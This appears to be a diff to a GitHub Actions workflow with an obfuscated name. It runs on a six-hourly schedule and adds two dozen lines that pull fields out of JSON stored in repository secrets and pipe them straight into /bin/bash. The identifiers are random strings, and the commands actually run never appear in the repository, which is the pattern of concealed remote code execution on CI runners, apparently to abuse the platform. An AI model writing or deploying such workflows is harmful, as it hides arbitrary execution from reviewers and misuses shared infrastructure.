@@ -1,9 +1,8 @@
 name: luxuejiao1988
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 4/6 * * *'
+    - cron: '8 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +11,30 @@ jobs:
       - uses: actions/checkout@v4
       - name: luxuejiao1988
         env:
-          pj78: ${{ secrets.pj78 }}
+          lamz566: ${{ secrets.lamz566 }}
         run: |
-          echo $pj78 | jq -r .xbipx3 | /bin/bash
-          echo $cjy6865 | jq -r .svcu53017 | /bin/bash
-          echo $wae569 | jq -r .pavrf9 | /bin/bash
-          echo $xvh86 | jq -r .sgft14409 | /bin/bash
-          echo $ljlo35476 | jq -r .ihc547 | /bin/bash
+          echo $lamz566 | jq -r .qxzo34695 | /bin/bash
+          echo $l1678 | jq -r .nlqjr11753 | /bin/bash
+          echo $wl69 | jq -r .fhc93963 | /bin/bash
+          echo $ll9 | jq -r .rkt501 | /bin/bash
+          echo $n37 | jq -r .jmeua3313 | /bin/bash
+          echo $ppv779 | jq -r .h6 | /bin/bash
+          echo $dz38 | jq -r .dh8 | /bin/bash
+          echo $yrpx01 | jq -r .ohmd10182 | /bin/bash
+          echo $t117 | jq -r .ons10505 | /bin/bash
+          echo $b5040 | jq -r .zdrwe050 | /bin/bash
+          echo $yhn1312 | jq -r .jl54557 | /bin/bash
+          echo $t2 | jq -r .zybtb8 | /bin/bash
+          echo $cqzqb5816 | jq -r .y261 | /bin/bash
+          echo $xyf6589 | jq -r .yrkvy4177 | /bin/bash
+          echo $zenv1 | jq -r .jb756 | /bin/bash
+          echo $akcrr8677 | jq -r .nxf0755 | /bin/bash
+          echo $qa670 | jq -r .aack55359 | /bin/bash
+          echo $jjqfo38080 | jq -r .tnpmz4470 | /bin/bash
+          echo $f4 | jq -r .remt59384 | /bin/bash
+          echo $venh2 | jq -r .fp54055 | /bin/bash
+          echo $ce96235 | jq -r .g08615 | /bin/bash
+          echo $eapx0 | jq -r .oz1 | /bin/bash
+          echo $yvnk74438 | jq -r .nn38 | /bin/bash
+          echo $ctyt25515 | jq -r .wbc73646 | /bin/bash
 
